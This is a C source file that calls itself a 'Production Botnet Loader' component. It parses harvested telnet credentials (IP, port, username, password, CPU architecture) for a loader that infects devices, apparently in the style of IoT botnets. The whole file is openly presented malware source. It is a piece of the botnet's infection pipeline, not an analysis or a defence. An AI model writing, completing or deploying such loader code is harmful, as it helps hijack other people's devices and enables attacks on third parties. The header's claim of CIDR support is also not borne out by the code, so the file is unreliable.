/*
 * Production Botnet Loader - Telnet Info Parser
 * ============================================================================
 * Parses credential strings from stdin
 * Format: IP:PORT username:password [architecture]
 * Supports: CIDR notation, custom ports, architecture hints
 * ============================================================================ */

#include "includes.h"
#include "telnet_info.h"
#include "util.h"

struct telnet_info *telnet_info_new(char *host, int port, char *user, char *pass, char *arch) {
    struct telnet_info *info = calloc(1, sizeof(struct telnet_info));
    if (info == NULL) return NULL;
    
    strncpy(info->host, host, sizeof(info->host) - 1);
    info->port = port;
    strncpy(info->user, user, sizeof(info->user) - 1);
    strncpy(info->pass, pass, sizeof(info->pass) - 1);
    
    if (arch != NULL) {
        strncpy(info->arch, arch, sizeof(info->arch) - 1);
    } else {
        strcpy(info->arch, "unknown");
    }
    
    return info;
}

struct telnet_info *telnet_info_parse(char *input) {
    /* Format: IP:PORT username:password [arch] */
    char *ip_port = strtok(input, " ");
    char *user_pass = strtok(NULL, " ");
    char *arch = strtok(NULL, " ");
    
    if (ip_port == NULL || user_pass == NULL) {
        return NULL;
    }
    
    /* Parse IP:PORT */
    char *colon = strchr(ip_port, ':');
    char host[32];
    int port = 23;
    
    if (colon != NULL) {
        *colon = 0;
        strncpy(host, ip_port, sizeof(host) - 1);
        port = atoi(colon + 1);
    } else {
        strncpy(host, ip_port, sizeof(host) - 1);
    }
    
    /* Parse username:password */
    colon = strchr(user_pass, ':');
    char user[64] = {0};
    char pass[64] = {0};
    
    if (colon != NULL) {
        *colon = 0;
        strncpy(user, user_pass, sizeof(user) - 1);
        strncpy(pass, colon + 1, sizeof(pass) - 1);
    } else {
        strncpy(user, user_pass, sizeof(user) - 1);
    }
    
    return telnet_info_new(host, port, user, pass, arch);
}
